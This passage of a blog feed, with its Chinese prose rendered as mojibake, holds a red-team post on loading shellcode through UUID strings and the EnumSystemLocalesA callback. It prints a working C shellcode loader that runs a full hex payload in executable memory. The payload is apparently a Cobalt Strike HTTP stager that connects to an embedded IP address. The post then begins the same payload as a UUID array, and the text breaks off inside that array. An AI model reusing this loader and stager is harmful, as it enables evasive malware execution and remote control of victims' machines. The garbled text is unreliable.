src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/477589136.png"></p><p>Psä¹Ÿå¯ä½¿ç”¨å¦ä¸€ä¸ªå¼€æºRSSé˜…è¯»é¡¹ç›®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;anyant&#x2F;rssant</span><br></pre></td></tr></table></figure><p>å¯¼å…¥è®¢é˜…æ–‡ä»¶,å³å¯é˜…è¯»</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3780341584.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1421809800.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3193456853.png"></p><p>å¦‚æœå‘ç°å¥½çš„ç½‘ç«™è®¢é˜…,ä¹Ÿå¯ä»¥è‡ªå·±æ·»åŠ </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/612828755.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢é˜ŸæŠ€å·§-åˆ©ç”¨uuidåŠ è½½shellcode</title>
      <link href="2021/01/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8uuid%E5%8A%A0%E8%BD%BDshellcode/"/>
      <url>2021/01/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8uuid%E5%8A%A0%E8%BD%BDshellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿‘æœŸå›½å¤–çš„Tweetä¸Šé¢çš„Check Point Researchå‘å¸ƒäº†ä¸€ç¯‡æœ‰è¶£çš„æ¨æ–‡ï¼š<br>è¿™ç¯‡æ¨æ–‡å¤§æ¦‚è®²çš„æ˜¯é€šè¿‡åˆ†æäº†ä¸€ä¸ªæ¶æ„æ ·æœ¬ï¼Œæ‰¾åˆ°ä¸€ç§éå¸¸æœ‰è¶£çš„å‘å†…å­˜å†™å…¥shellcodeæ–¹å¼ã€‚<br>è¿™é‡Œå°±ä¸ç»†ç©¶é’“é±¼æ–‡æ¡£åˆ©ç”¨å®åŠ è½½shellcodeçš„ç»†èŠ‚äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹è¿™ç¯‡æ–‡ç« ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2021&#x2F;01&#x2F;23&#x2F;rift-analysing-a-lazarus-shellcode-execution-method&#x2F;</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š<br>åœ¨è‡ªå®šä¹‰ä»£ç ä¸­ï¼Œæ”»å‡»è€…ä½¿ç”¨äº†windows api éå†äº†å¤§é‡ç¡¬ç¼–ç  UUID å€¼åˆ—è¡¨ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½æä¾›æŒ‡å‘åˆ†é…å†…å­˜ï¼ˆå †ï¼‰çš„æŒ‡é’ˆï¼Œæ·±å…¥åˆ†æåï¼Œå‘ç°äº†ä¸€ç§å°†æ•°æ®å†™å…¥å †çš„æ–¹æ³•ã€‚<br>è¿™ç§æŠ€æœ¯æ—©åœ¨2017å¹´å°±æœ‰å›½å¤–å¤§ä½¬æå‡ºï¼Œä½†æ˜¯æœ€è¿‘æ‰æŠ“åˆ°æ¶æ„æ ·æœ¬ï¼Œçˆ†å‡ºæ¥ï¼ï¼</p><h1 id="uuidæ˜¯ä»€ä¹ˆ"><a href="#uuidæ˜¯ä»€ä¹ˆ" class="headerlink" title="uuidæ˜¯ä»€ä¹ˆ?"></a>uuidæ˜¯ä»€ä¹ˆ?</h1><p>é€šç”¨å”¯ä¸€è¯†åˆ«ç (Universally Unique Identifier,ç¼©å†™ï¼šUUID),æ˜¯ç”¨äºè®¡ç®—æœºä½“ç³»ä¸­ä»¥è¯†åˆ«ä¿¡æ¯æ•°ç›®çš„ä¸€ä¸ª128ä½æ ‡è¯†ç¬¦ï¼Œæ ¹æ®æ ‡å‡†æ–¹æ³•ç”Ÿæˆï¼Œä¸ä¾èµ–ä¸­å¤®æœºæ„çš„æ³¨å†Œå’Œåˆ†é…ï¼ŒUUIDå…·æœ‰å”¯ä¸€æ€§ã€‚<br>å½“ç„¶è¿˜æœ‰ä¸€ç§GUIDï¼ˆå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆè‹±è¯­ï¼šGlobally Unique Identifierï¼Œç¼©å†™ï¼šGUIDï¼‰ï¼‰ï¼Œæ˜¯ä¸€ç§ç”±ç®—æ³•ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†ï¼Œé€šå¸¸è¡¨ç¤ºæˆ32ä¸ª16è¿›åˆ¶æ•°å­—ï¼ˆ0ï¼9ï¼ŒAï¼Fï¼‰ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå¦‚ï¼š{21EC2020-3AEA-1069-A2DD-08002B30309D}ï¼Œå®ƒå®è´¨ä¸Šæ˜¯ä¸€ä¸ª128ä½é•¿çš„äºŒè¿›åˆ¶æ•´æ•°</p><h3 id="1-é‚£ä¸¤ç§æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#1-é‚£ä¸¤ç§æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="1.é‚£ä¸¤ç§æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>1.é‚£ä¸¤ç§æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3><p>ç®€å•çš„è¯´ï¼Œuuid æ˜¯ä¸€ç§æ ‡å‡†, è€Œguidæ˜¯uuidçš„ä¸€ç§å®ç°.ï¼ŒGUID æ˜¯å¾®è½¯å¯¹UUIDè¿™ä¸ªæ ‡å‡†çš„å®ç°ã€‚</p><h3 id="2-UUIDæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#2-UUIDæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="2.UUIDæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a>2.UUIDæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</h3><p>çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š<br>COMBï¼ˆcombineï¼‰å‹æ˜¯æ•°æ®åº“ç‰¹æœ‰çš„ä¸€ç§è®¾è®¡æ€æƒ³ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ç§æ”¹è¿›çš„GUIDï¼Œå®ƒé€šè¿‡ç»„åˆGUIDå’Œç³»ç»Ÿæ—¶é—´ï¼Œä»¥ä½¿å…¶åœ¨ç´¢å¼•å’Œæ£€ç´¢äº‹æœ‰æ›´ä¼˜çš„æ€§èƒ½ï¼Œæ•°æ®åº“ä¸­æ²¡æœ‰COMBç±»å‹ï¼Œå®ƒæ˜¯Jimmy Nilssonåœ¨ä»–çš„â€œThe Cost of GUIDs as Primary Keysâ€ä¸€æ–‡ä¸­è®¾è®¡å‡ºæ¥çš„ã€‚<br>COMBæ•°æ®ç±»å‹çš„åŸºæœ¬è®¾è®¡æ€è·¯æ˜¯è¿™æ ·çš„ï¼šæ—¢ç„¶UniqueIdentifieræ•°æ®å› æ¯«æ— è§„å¾‹å¯è¨€é€ æˆç´¢å¼•æ•ˆç‡ä½ä¸‹ï¼Œå½±å“äº†ç³»ç»Ÿçš„æ€§èƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡ç»„åˆçš„æ–¹å¼ï¼Œä¿ç•™UniqueIdentifierçš„å‰10ä¸ªå­—èŠ‚ï¼Œç”¨å6ä¸ªå­—èŠ‚è¡¨ç¤ºGUIDç”Ÿæˆçš„æ—¶é—´ï¼ˆDateTimeï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°†æ—¶é—´ä¿¡æ¯ä¸UniqueIdentifierç»„åˆèµ·æ¥ï¼Œåœ¨ä¿ç•™UniqueIdentifierçš„å”¯ä¸€æ€§çš„åŒæ—¶å¢åŠ äº†æœ‰åºæ€§ï¼Œä»¥æ­¤æ¥æé«˜ç´¢å¼•æ•ˆç‡ã€‚<br>ç®€è€Œè¨€ä¹‹ï¼šUUID çš„ç›®çš„æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œéƒ½èƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ï¼Œè€Œä¸éœ€è¦é€è¿‡ä¸­å¤®æ§åˆ¶ç«¯æ¥åšæ ‡è¯†çš„æŒ‡å®šã€‚å¦‚æ­¤ä¸€æ¥ï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥å»ºç«‹ä¸ä¸å…¶å®ƒäººå†²çªçš„ UUIDï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œå°±ä¸éœ€è€ƒè™‘æ•°æ®åº“å»ºç«‹æ—¶çš„åç§°é‡å¤é—®é¢˜ã€‚</p><h1 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h1><p>é¦–å…ˆæˆ‘ä»¬å¾—å…ˆå…³æ³¨ä¸€ä¸‹ä¸¤ä¸ªwindows api å‡½æ•°</p><h3 id="1-UuidFromStringA"><a href="#1-UuidFromStringA" class="headerlink" title="1.UuidFromStringA"></a>1.UuidFromStringA</h3><p>æŸ¥çœ‹å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ï¼Œç»™å‡ºäº†è¿™æ ·çš„è§£é‡Šï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2639796569.png"></p><p>è¿™ä¸ªæ„æ€è¯´å§ï¼ŒæŠŠuuidå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚åºåˆ—ï¼Œè¯¥api éœ€è¦ä¸¤ä¸ªå‚æ•°<br>1.è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚åºåˆ—çš„uuidçš„æŒ‡é’ˆ<br>2.ä»¥äºŒè¿›åˆ¶å½¢å¼è¿”å›æŒ‡å‘UUIDçš„æŒ‡é’ˆ</p><p>ç¬¬ä¸€é¡¹å‚æ•°å¾ˆå¥½ç†è§£ï¼Œç¬¬äºŒé¡¹å‚æ•°å¯èƒ½ç¿»è¯‘è¿‡æ¥æœ‰ç‚¹ç‰µå¼ºï¼Œå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ç”¨æ¥æ¥æ”¶äºŒè¿›åˆ¶å­—èŠ‚åºåˆ—çš„æŒ‡é’ˆã€‚<br>å…¶å®python ä¸­ä¹Ÿæœ‰uuidåº“ï¼Œè½¬æ¢æŒºæ–¹ä¾¿çš„ï¼ŒæŠŠå­—èŠ‚åºåˆ—è½¬æ¢æˆuuidï¼Œå†æŠŠuuidè½¬æ¢æˆå­—èŠ‚åºåˆ—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4119777440.png"></p><p>è¿˜æœ‰éœ€è¦æ³¨æ„çš„ç‚¹ï¼Œå°±æ˜¯windows äºŒè¿›åˆ¶å­—èŠ‚åºåˆ—æ˜¯ç”¨çš„å°ç«¯è®¡æ•°æ³•,è½¬æ¢æ—¶ä¸”äºŒè¿›åˆ¶åºåˆ—å¿…é¡»16ä¸ªå­—ç¬¦ä¸ºä¸€ç»„ã€‚</p><h3 id="2-EnumSystemLocalesA"><a href="#2-EnumSystemLocalesA" class="headerlink" title="2.EnumSystemLocalesA"></a>2.EnumSystemLocalesA</h3><p>å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1012990053.png"></p><p>è¿™é‡Œç‰µæ‰¯åˆ°å›è°ƒå‡½æ•°ï¼š<br>å›è°ƒå‡½æ•°å°±æ˜¯ä¸€ä¸ªé€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨çš„å‡½æ•°ï¼Œæ„æ€æ˜¯é€šè¿‡å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨å‡½æ•°ï¼Œå­—é¢ä¸å¥½ç†è§£ï¼Œä½ ä¸å¦¨çœ‹çœ‹ä»¥ä¸‹ç¤ºä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆï¼ˆ<span class="keyword">void</span>ï¼ˆ*ï¼‰ï¼ˆï¼‰ï¼‰execï¼‰();</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¾ˆç»å…¸ï¼Œå¾ˆå¤šäººçœ‹äº†å¾ˆæ‡µé€¼ï¼Œä½†æ˜¯å¯¹äºæ‡‚æŒ‡é’ˆçš„äººæ¥è¯´ï¼Œç†æ‰€å½“ç„¶ï¼Œåœ¨cè¯­è¨€ä¸­ï¼Œå‡½æ•°å˜é‡åå­˜çš„å°±æ˜¯ä¸€ä¸ªå‡½æ•°å…¥å£åœ°å€ï¼Œæ¢å¥è¯è¯´å‡½æ•°å˜é‡åå°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p>ç„¶åå†è®©æˆ‘ä»¬ç†è§£ä»¥ä¸‹ä¸Šé¢é‚£å¥ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>(*)() <span class="comment">#å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå‡½æ•°è¿”å›å€¼ä¸ºç©º</span></span><br><span class="line">ï¼ˆï¼ˆ<span class="keyword">void</span>ï¼ˆ*ï¼‰ï¼ˆï¼‰ï¼‰exec <span class="comment">#å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ŒæŠŠexecæŒ‡é’ˆå¼ºåˆ¶è½¬æ¢æˆå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">ï¼ˆï¼ˆ<span class="keyword">void</span>ï¼ˆ*ï¼‰ï¼ˆï¼‰ï¼‰execï¼‰();<span class="comment">#æ‰§è¡Œå…¥å£åœ°å€ä¸ºexecæŒ‡å‘çš„åœ°å€çš„å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>è€ŒEnumSystemLocalesA å‡½æ•°çš„ç¬¬ä¸€æ¬¡ä¸ªå‚æ•°å°±æ˜¯å›è°ƒå‡½æ•°åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å®šè¦æšä¸¾çš„è¯­è¨€ç¯å¢ƒæ ‡è¯†ç¬¦çš„æ ‡å¿—ã€‚</p><p>é‚£ä¹ˆä¸Šé¢çš„å°±å¯ä»¥å†™æˆè¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EnumSystemLocalesAï¼ˆexec,<span class="number">0</span>ï¼‰;</span><br></pre></td></tr></table></figure><h1 id="åˆ©ç”¨uuidæ¥åŠ è½½shellcodeï¼Œä¸Šçº¿cs"><a href="#åˆ©ç”¨uuidæ¥åŠ è½½shellcodeï¼Œä¸Šçº¿cs" class="headerlink" title="åˆ©ç”¨uuidæ¥åŠ è½½shellcodeï¼Œä¸Šçº¿cs"></a>åˆ©ç”¨uuidæ¥åŠ è½½shellcodeï¼Œä¸Šçº¿cs</h1><p>æˆ‘ä»¬å…ˆæ¥çœ‹æ™®é€šçš„shellcode çš„cåŠ è½½æ–¹å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line">#ä¸å¼¹çª—</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[]=<span class="string">&quot;shellcode binary &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(xor_xcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(a, xcode, <span class="keyword">sizeof</span>(xcode));</span><br><span class="line">  ((<span class="keyword">void</span>(*)())a)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x31\x6b\x6a\x56\x00\xfe\xdc\x7a\x2d\x31\xc9\xe7\x28\x1e\xb5\x42\x5f\x62\xa3\xf5\x64\x42\x79\x2d\xa2\xd8\xf7\x74\xca\xc1\x64\xc7\xc2\xfe\x32\xb2\x36\x0a\xa0\x90\x4e\xfa\xd4\x47\x04\xa4\x8b\xd9\xe6\x65\xa1\x8f\xbe\xe4\xb6\x95\x63\xf0\xb4\x46\x20\x85\xf8\x60\x5e\xb1\xf8\xa0\x59\xef\x9e\xb2\xc6\xe6\xf9\x5d\x8e\x07\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x54\x6f\x75\x63\x68\x3b\x20\x4d\x41\x53\x50\x4a\x53\x29\x0d\x0a\x00\x91\xa8\x10\xb7\xda\x80\x7f\xab\xc7\x23\x16\x2f\x4b\x61\xbd\xeb\xa5\x14\x6f\x90\x4b\xdf\x5a\x58\xe0\x57\x55\x1f\xdb\x6a\x56\x74\xc2\xa1\x9c\x9f\x32\xda\x91\x0d\x01\x10\x2d\x95\xef\x8e\x49\x72\x3a\x2b\x9e\x59\x8e\x85\xa6\xad\xb6\x9c\xc6\x98\x10\x7d\x09\x1f\x60\xa3\x4a\xea\xbe\x4a\xf5\x49\x8a\xc7\x18\xd6\x60\x22\x51\x17\xb8\xd6\x61\xd3\x8a\x81\x37\x3e\x6a\x3d\x1c\x3d\xc5\xf3\xa0\x57\x02\x04\x44\x57\xc1\x14\x23\x71\xc2\x08\x87\x6c\x94\x6b\x89\xc1\xd9\x2b\xcc\x6b\x62\x25\x3f\xbb\x9f\x56\x02\xf1\x54\x4d\x4d\x91\x4e\x89\x5b\xda\x5f\xf0\x92\xa5\xac\xb2\xaf\xcf\xbb\xe2\xaf\xb0\xca\x5b\x08\x83\x4c\x92\x7a\xb5\x97\xb9\xd2\x07\xc9\x8f\xb7\x80\xfc\x26\x3d\xa3\xd1\x9e\x29\x42\x05\xcd\x0b\x78\xc2\x11\x86\x4f\x66\x57\xda\xe2\x4b\x98\xcc\x46\x4d\xe5\xbd\xfe\xc7\x2c\xc4\xd3\xe5\xc0\xf9\x43\xca\xd4\x1d\x5a\x73\xda\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x30\x2e\x31\x39\x2e\x34\x32\x2e\x31\x34\x34\x00\x12\x34\x56\x78&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* shellcode = (<span class="keyword">void</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  ((<span class="keyword">void</span>(*)())shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ¥åˆ©ç”¨uuidå†™shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] = &#123; <span class="string">&quot;0089e8fc-0000-8960-e531-d2648b52308b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c7e2f05257&quot;</span>,<span class="string">&quot;8b10528b-3c42-d001-8b40-7885c0744a01&quot;</span>,<span class="string">&quot;488b50d0-8b18-2058-01d3-e33c498b348b&quot;</span>,<span class="string">&quot;ff31d601-c031-c1ac-cf0d-01c738e075f4&quot;</span>,<span class="string">&quot;3bf87d03-247d-e275-588b-582401d3668b&quot;</span>,<span class="string">&quot;588b4b0c-011c-8bd3-048b-01d089442424&quot;</span>,<span class="string">&quot;59615b5b-515a-e0ff-585f-5a8b12eb865d&quot;</span>,<span class="string">&quot;74656e68-6800-6977-6e69-54684c772607&quot;</span>,<span class="string">&quot;ff31d5ff-5757-5757-5768-3a5679a7ffd5&quot;</span>,<span class="string">&quot;000084e9-5b00-c931-5151-6a0351516850&quot;</span>,<span class="string">&quot;53000000-6850-8957-9fc6-ffd5eb705b31&quot;</span>,<span class="string">&quot;006852d2-4002-5284-5252-53525068eb55&quot;</span>,<span class="string">&quot;d5ff3b2e-c689-c383-5031-ff57576aff53&quot;</span>,<span class="string">&quot;062d6856-7b18-d5ff-85c0-0f84c3010000&quot;</span>,<span class="string">&quot;f685ff31-0474-f989-eb09-68aac5e25dff&quot;</span>,<span class="string">&quot;68c189d5-2145-315e-ffd5-31ff576a0751&quot;</span>,<span class="string">&quot;b7685056-e057-ff0b-d5bf-002f000039c7&quot;</span>,<span class="string">&quot;ff31b774-91e9-0001-00e9-c9010000e88b&quot;</span>,<span class="string">&quot;2fffffff-6b31-566a-00fe-dc7a2d31c9e7&quot;</span>,<span class="string">&quot;42b51e28-625f-f5a3-6442-792da2d8f774&quot;</span>,<span class="string">&quot;c764c1ca-fec2-b232-360a-a0904efad447&quot;</span>,<span class="string">&quot;d98ba404-65e6-8fa1-bee4-b69563f0b446&quot;</span>,<span class="string">&quot;60f88520-b15e-a0f8-59ef-9eb2c6e6f95d&quot;</span>,<span class="string">&quot;5500078e-6573-2d72-4167-656e743a204d&quot;</span>,<span class="string">&quot;6c697a6f-616c-352f-2e30-2028636f6d70&quot;</span>,<span class="string">&quot;62697461-656c-203b-4d53-49452031302e&quot;</span>,<span class="string">&quot;57203b30-6e69-6f64-7773-204e5420362e&quot;</span>,<span class="string">&quot;57203b32-574f-3436-3b20-54726964656e&quot;</span>,<span class="string">&quot;2e362f74-3b30-5420-6f75-63683b204d41&quot;</span>,<span class="string">&quot;534a5053-0d29-000a-91a8-10b7da807fab&quot;</span>,<span class="string">&quot;2f1623c7-614b-ebbd-a514-6f904bdf5a58&quot;</span>,<span class="string">&quot;1f5557e0-6adb-7456-c2a1-9c9f32da910d&quot;</span>,<span class="string">&quot;952d1001-8eef-7249-3a2b-9e598e85a6ad&quot;</span>,<span class="string">&quot;98c69cb6-7d10-1f09-60a3-4aeabe4af549&quot;</span>,<span class="string">&quot;d618c78a-2260-1751-b8d6-61d38a81373e&quot;</span>,<span class="string">&quot;3d1c3d6a-f3c5-57a0-0204-4457c1142371&quot;</span>,<span class="string">&quot;6c8708c2-6b94-c189-d92b-cc6b62253fbb&quot;</span>,<span class="string">&quot;f102569f-4d54-914d-4e89-5bda5ff092a5&quot;</span>,<span 